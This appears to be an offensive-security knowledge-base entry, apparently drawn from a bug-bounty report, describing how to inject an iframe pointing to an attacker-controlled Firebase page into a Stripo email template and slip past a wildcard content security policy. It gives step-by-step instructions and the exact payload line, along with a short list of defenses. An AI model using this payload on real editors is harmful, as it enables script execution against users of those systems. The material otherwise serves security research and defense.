---
tags:
  - iframe-injection
  - html-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:24:31.369Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 6a4f5a7e-13c5-490f-99e6-ab44137267be
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Iframe-Payload-into-Template

## Summary

This procedure inserts an iframe tag pointing to the malicious Firebase page into the Stripo template's HTML, exploiting the CSP's wildcard allowance for *.firebaseapp.com without sanitization blocking it.

## Description

Once the template is open, the attacker adds <iframe src="//hackerone-jm.firebaseapp.com"></iframe> directly into the HTML editor. The lack of input validation combined with the permissive CSP enables this, allowing the iframe to load and execute JavaScript in the context of the editor or viewer page.

## Requirements

1. Open template in Stripo HTML editor
2. Known Firebase subdomain URL from prior deployment
3. No additional tools; browser-based

## Defense

Defensive measures and detection strategies:

- Sanitize HTML inputs to strip or escape iframe tags
- Tighten CSP to specific frame-src domains only
- Log and review template HTML for external embeds

## Objectives

1. Embed external malicious content
2. Bypass CSP restrictions
3. Set up for execution on preview

## Instructions

### Step 1: Locate HTML Editor

**Context**: Switch to HTML view in the template editor.

In the Stripo interface, click the HTML/code editor tab.

> This exposes raw HTML for editing.

### Step 2: Insert Iframe Tag

**Context**: Add the payload to trigger the Firebase load.

Paste into the HTML:

```html
<iframe src="//hackerone-jm.firebaseapp.com"></iframe>
```

> Use protocol-relative URL (//) for flexibility. Save the template.

### Step 3: Validate Insertion

**Context**: Ensure no errors on save.

Preview briefly (without full load) or check source.

> Success if iframe persists in HTML without removal.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[iframe-injection]]
- [[html-injection]]
